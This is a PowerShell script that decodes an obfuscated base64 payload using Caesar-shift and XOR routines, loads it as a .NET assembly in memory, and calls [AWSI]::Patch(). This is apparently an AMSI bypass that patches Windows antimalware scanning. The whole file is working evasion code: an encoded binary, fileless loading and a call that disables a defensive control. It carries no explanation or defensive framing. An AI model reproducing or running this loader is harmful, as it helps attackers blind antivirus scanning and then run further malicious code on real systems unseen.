
function xor {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [string] $key
    )
    [Byte[]] $b = new-object -TypeName Byte[] -ArgumentList @($s.Length);
    [Byte[]] $kb = [System.Text.Encoding]::ASCII.GetBytes($key);
    for($i=0; $i -lt $b.Length; $i++) {
        $b[$i] = ($s[$i] -bxor $kb[$i % $kb.length]) -band 0xff;
    }
    return ,$b;
}
function cae {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [int] $key
    )
    [Byte[]] $b = new-object -TypeName Byte[] -ArgumentList @($s.Length);
    for($i=0; $i -lt $b.Length; $i++) {
        $b[$i] = ($s[$i] -$key) -band 0xff;
    }
    return ,$b;
}
function b64 {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Byte[]] $s,
        [Parameter(Position = 1)] [int] $key
    )
    [System.Collections.Generic.List[Byte]] $g = New-Object System.Collections.Generic.List[Byte](,$s);
    for($i=0; $i -lt $key; $i++) {
        $g = new-object System.Collections.Generic.List[Byte](,[System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($g.ToArray())));
    }
    return $g.ToArray();
}

if ([Environment]::Is64BitProcess)
{
    Write-Host "64-bit OS"
}
else
{
    Write-Host "32-bit OS"
}
$buf = [System.Convert]::FromBase64String("RDgBZm13bnFqcHdumKNwd9ZxZnB3bnFmMHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZw925xZmpy2Gdm5ICpUt5vQ6lSOgggH1EWHiITIwULVw8SFAoiIlEIE1cgHhRQIAxRKikmTgYTFBxMZnFmW25xZnB3bnE2M3duDexud4ZvuZx3bnFmcHducZZwVU5saGB3bmVmcHdycWZwd25xZnB3bnFGcHducWbweG5xZnBXbnFmbndubWZwd25xZnB5bnFmcHducWYQd25xaHB3bnFmcHZuEelwdy5xZnB3bnEmcHducWZwd26BZnB3bnFmUHducWZwd25xZnBnbnFmcHducWZwd25xZnB3bnFmcHcucWbodm5xZnB3bnFmcHducWZwd25xZnB3bnFmcHduHU1wd1ZxZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25RZnA/bnFmcHducWZwd25HGhMPInFmcG9ocWZwV25xZmx3bnFocHducWZwd25xZnB3bnFGcHcORxgdBQ9xZnD/b3FmcDducWZ0d25xdHB3bnFmcHducWZwd25xJnB3LnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd24pZnB3cHFpcCtNcWZQf25xZXB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZ1R3JxvXB3bnJmcGhGbmZweUpHgutlbnFlZnmEUd5wd271bIFyQ/VseGn6b31783R7RvB3bnECcm5OtGZwd/pMWXoEgHFmb310f0bYd25xAnJqe0ACcm+E9Wx3dPpvgFD3bnFm/Hl3Uahwd271bHxydvVse2n6cRhvd24hTm93bm8YfXduIU5ud25vb3F57AoQSIJucXB5N4BzTm13bm9Mcmlzb/QHX35xZmZ6dOcNBl9rcWZmf4BzTm13bm9MgYS8Und0X31xZmYFXXFmIGhyCHhwd2hJd3B3aAh6cHdot2aCXWVLZnB3bYFmcHduDGYlyW54dXB3bU9Og3dua4SaeEh3aEhpbnFwRnduMzcmNW1xZXB3bnFmbHducRxkYV5HV2BGXVpmcHdubmYMd25x3m53blQkcHdSdGZwJ29xZk0mIiMNChofcWZwdyJvZnBDbnFmTSw/caZyd26BZnB3TzA5JztucWbAeW5xNm93blQoDCIQcWZwd25xZm53bnIrg9WBamZwd26bZV13hHFmb3ducX5wd25zZnB3dHFmcHpucWaCd25xdHB3bnJmcHdtcWZweG5xZm93bnFlcHdudGZwd21xZnB4bnFmcHeAc2Vwd25xZnJ3ZHIAbnlu1GX2dXRxEHAfcGhm1nVucWxw5W5KaHJ3dXJNbnlum2ZHdXRx8G9gcG9mQnhFc2xwIm1KaHJ3xXFNbnluF2YVdXRxQnAOcG9mu3dFc2xwu26/ZXJ3oXNIbnluXGhOdXRxpW9VcG9mEHVQc2xwlG0caHJ3THFIbnluLmhpd3Rxlm9VcG9mD3VQc2Zwd25yZnB3bnFlcHhucmaAd2hxZnA4bnJmb3ducWZw927/RjR2LHFlcHducWbwdwRRuW4mbnNmcHduceZw6U5sZzd3cnEuUHducWYCd6NyCHB/bjFFcHducfxoWm8TZmh3KFJmcHdu7342dXRxbnB3bnJmMXducWVwSW5xZm53XHFmcHhujWhwd3Bxs293bnRmdnZwcWpwk3BqZjZ1bXF1cC1wb2Z3dzhzcHBgbjtogHddcUBuZ25aZjZ1fnElcC1wgWYndzhzdnAobjtogHc1cUBuZ24SZjZ1gXENcC1wgWYfdzhzdnAQbjtogHf1cVdtW27SZll2RXHNcCdwY2bnd1BxW3DQbodoVXfdcThwZ26yZrJ4LXHlcC1wb2ZKd2dxEHBhboRmHXdMcX9w5W5HZk1393FUcF5uxWZKd19x0nBhblxmzHdMcSdw7m5HZiV34HFUcCZuxWZKdzdx0nBhbhRmpndMcQ9wi25HZh13bXKAcHVucmZwd0d0DHB1bm5mbXdxcypvdm4tZ293L3JpcKxwcmZweHNxb214bm3mcHdtcWZwd25xZnB3bnFmcMBwcWZ0d25xZnB3bnFmcHcxcX1wd25xZnB3blUxCRshBQlady1ANyd3PxoXJBwJRy0pdwkkBwkFCgoIcBoRHUMrHB8kBREcbjQTCgYLBQlwHykICiMjEXEWHiIPJwULHG4FFjIgCg40DyQRcTseICIOMgchEXErIyASMhokBQUTGSQcbi0JDgwTEAUOIxEyGiQFBRMZJBxuNBMLKQUkDQ4jETIaJAUFExkkHG4yFx0cCRMSFysFHRITOCIdGAcVIR0JcDgfJAkLFQoaOh4YEg4RDwUHMhokBQUTGSQcbj0FHhoRHSweGAkOGwkFBzIaJAUFExkkHG4yFx0cCRMSFzkFBQlCHCAkDQkhLR0aHiAQHhoTdy0kFxMkEAUdLSIMDw0RDCASGgciDDIaJAUFExkkHG4yFx0cCRMSFzsRJAceIB4dDQkhLR0aHiAQHhoTdy8IESAgChIaByIMQwkMGBYSGgciDCQlJAsgCggjCxFxJR0GEQYIDBA+IxMUDA8dJSQLIAoIIwsRcSUdBhEGCAwQLwgWFwUFEA4kOCIdGAcVIR0JcDgfJAkLFQoaJwkkHhIUFzgiHRgHFSEdCXAlIQcaByQRNBMLBw0dDQ4gCgoaFzgiHRgHFSEdCXA1FR0JcBoRHUM9IBgOZhQKPwogE3c/GhckHAlHOCMhIgoRE2FEDhgdIAsHDQoabkQaHiAMEGZAGCIUDnBEDSMXCBgKcQ8TBQwOEl1FTA0SDHctJjcnMjAaFg8GH0cKDCNuRB0dCxEGZj0QHx0JC2FADgwMHA8dDQkhbi4eDRweHQ0JIW49CRgLQyMNJBwgcQsTCzsuGB4iIHFUDQsLI2ZDQAwdNiQFbkQdHQsRBlQ0IA0QFAkGIgoHHXc/GhckHAlHOCMhIgoRE2ElBxoTBQshNxMFJAoHEwZuRB0dCxEGVD4MDB0NCxxMNBMLBwUFCR4mESMcBxYRJGY0HBAeCxEgDBAxCRsRJGYvRD8qQy4QHhIXHXczDhpABQsUJRQbIA4XHXcKISUUGyAOFx13LwgUDRgicTMOHREUGnAjHg8SKSMSQRgJCxEUGnApBSMaIxgKQRgJCxEUGnAZCicJIScgCBoTFiJxCxMLOyoXYkswChpwIh44KRgHCgoHBwtuNBMgEG4lEw8bKgoIHhggGmZwaA1xEXAGbgpmSncScRJwI25xgS93CXEXcCBuRGYNdw1xFHA1bh5mEncUcQlwBW5xezN3FnEHcBxuIWYkdwVxE3AhbltmUHducWZw4serEDF5Fif8cBFLqDNVp25tRm94ZnRGcHhxUWVvaH1tRm94bG1Gb3hwamtzdHF5bW5lMW1mb3BnaWZ0eHlubnh/cnFmfjBvUWZqfG5zdGqBb3FmaH/jG0JCcGKR7XR3bXl0c3dweX5qf25taHhwZYFtbXduc2dod3BpZXB/bnFmcHd8cmZvd0JzfEEFDSE0CSExGQcTByIKEworBiMTIQZtaWVwdW5xZnB3fnJmZTgpRC05NRUhBR0GbnFpb3ducWaBeG6DJwkHFSMNER8iUajHV05jVl5GbnFNb3dSYVtkUF9fB19kDWQJXmRiWgoOZFYTCl1kZGFbVxViDgpgHFUNZnCDbXFrX2FeR1ZKR25xMW93ekc0Mys0IwULHCMIGAVjRA4YHSALB2EiS0xeVF94bj10hDkgEhETCgsjDzQgHyESDxAsEhETa0wnKURXNCMFCxwjCBgFV2JHWUpIbnFmcHf/RCfSd25xZm53bnEScHduxU1wd8psZnB3bnFmcHducWZwd26BZnB3bnFmcHducWZwd25xOD07P8MNdeNHhi4qzwD2nr5pmMhlcHduNGA8LB8OGB0zEiIbExg6JBMjBQ8OQh4cHggXPDgpRC05NRUhBR0GOjIxPUA7Mx0gGB8kQgkVCDUeYks6QwkMHA0kCTw4KUQtOTUVIQUdBkwhCg53bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWVwZ25xZnh3bvFmcHducWZwd25xZnB3bnJmb3ducVZwd+5xZnB3bnFmcHducWZwd21xZnB3bilmcHc2MWZwY29xZnB3bnFmcHduRWdkd25xPHAmbjhmQncxcThwJm4qZil3LHFDcEBuJ2YydytxZnB3btZqiZFucWVwd25yZnB3bnFmcHhucWZwd1txZnB3bnFmdHducWhwd25xZnB3bnFmcHducWY0d25xZXApbhJmHnc0cQ1wI24OZid3DHEMcCJucWZwd1JxanB3bj1mHncNcRRwBm4FZg93InENcCJuB2Zwd25xZnDHcuVocHdtcTdwC24jZgd3DHELcDluCmYMdxFxLXAhbg9mCXducQ5ud25yZmB3XnFWcEduYWZkdxBxVnB3bntmb3dtcSdwIm4GZgt3EXEUcAtuJGZwd25xZnBVbnJmb3cvcRNwJG4hZg93DHEdcEFuEmYLdxFxZnB3bnFmcHcucXJweG4vZgd3CnEJcDtuDmYddw9xGHAgbiFmJHcFcRNwIW5xZnB3LXExcCZuKmY5dzBxHXAHbhJmHXcfcWZwR25pZm93NHENcCNuDmZCdxFxGHAGbgpmCXcMcWZwd25iZkp3XnFUcEduR2Zgd25xJnBnbnJmJ3cMcRpwHG4jZgp3DXEScEFuEmYLdxFxZnA4biZmPXclcUNwNW4aZiB3DXEXcAZuR2YUdwpxEnB3bilmfndtcTJwHG4QZg93CnEncCJuIWYXdyBxDXAabglmJHducSdwIm4hZhd3IHENcBpuCWYkd05xzXBXblFmXndecVhwRm5xZkZ3bXFlcENuDmYRdw1xEnArbiNmD3cScQlwJG4SZh53B3EXcHducWZwd25xLnBnbnJmKXcgcQ1wGm4KZgp3DXEScDluCmYMdxFxFHAYbgZmE3ducSVwRG5EZid3O3EocBBuIWYPdx9xF3Bhbg1mDHcKcWZwT25lZm93PnEYcCJuDWYjdw9xGnBBbhJmC3cRcWZwd24yZit3P3EtcDJuM2YXdx5xBXAGbiRmcHdicW5weG5BZh53C3EKcAxuFGYkd0RxCXAFbiRmB3cLcRRwd25iZkp3XnFUcEduR2Zgd25xXnB/bnJmL3cfcRdwHG4GZg53CnEdcFduP2YTdyBxF3AgbghmCnducVVwYW5hZkp3XnFUcEducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25xZnB3bnFmcHducWZwd25x")
$buf = cae $buf 5;$buf = xor $buf "rilak"
[System.Reflection.Assembly]::Load($buf)
[AWSI]::Patch()

